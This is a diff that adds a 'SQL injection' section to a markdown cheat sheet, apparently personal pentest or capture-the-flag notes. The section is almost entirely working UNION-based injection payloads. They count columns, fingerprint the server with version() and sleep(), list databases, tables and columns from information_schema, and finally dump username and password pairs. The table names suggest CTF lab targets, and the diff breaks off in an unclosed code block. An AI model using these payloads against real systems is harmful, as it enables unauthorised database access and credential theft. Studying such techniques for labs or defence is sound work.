@@ -215,7 +215,27 @@ git add .
 git commit
 git push origin master
 ```
-
+#### SQL injection
+> 1. Flow: DB -> Table -> Column Name - Data
+> 1. Find injection point.
+> 1. Finding the exact number of columns before running UNION command.
+	```bash search=mary'+union+select+1--+%3b```
+	```bash id=1' union select 1,2,3,4,5-- -;```
+> 1. DO @@verision or version() or sleep(5) for testing purposes.
+	```bash id=0' union select 1,@@version,3,4,5,6-- -;```
+	```bash id=0' union select 1,sleep(5),3,4,5,6-- -;```
+> 1. Find the names of DATABASES present.
+	```bash search=mary' union SELECT concat(schema_name),2,3,4,5,6 FROM information_schema.schemata-- -;```
+	```bash id=0' union select 1,GROUP_CONCAT(CONCAT(schema_name)),3,4,5,6 FROM information_schema.schemata;-- -;```
+> 1. Find the tables name of a particular DATABASE.
+	```bash search=mary' union SELECT concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.TABLES WHERE table_schema='Staff' -- ;```
+	```bash id=0' union SELECT 1,GROUP_CONCAT(CONCAT(TABLE_NAME)),3,4,5,6 FROM information_schema.TABLES WHERE table_schema='darkhole_2'-- -;```
+> 1. Find the columns name of a particular TABLE
+	```bash search=mary' union SELECT column_name,2,3,4,5,6 FROM information_schema.columns WHERE table_name = 'StaffDetails' -- ;```
+	```bash 0' union SELECT 1,GROUP_CONCAT(CONCAT(column_name)),3,4,5,6 FROM information_schema.columns WHERE table_name = 'users' -- ;```
+> 1. Dumping the data. 
+	```bash search=mary' union SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM users.UserDetails-- ;```
+	```bash 	
 	
 #### XXE injection
 ```bash
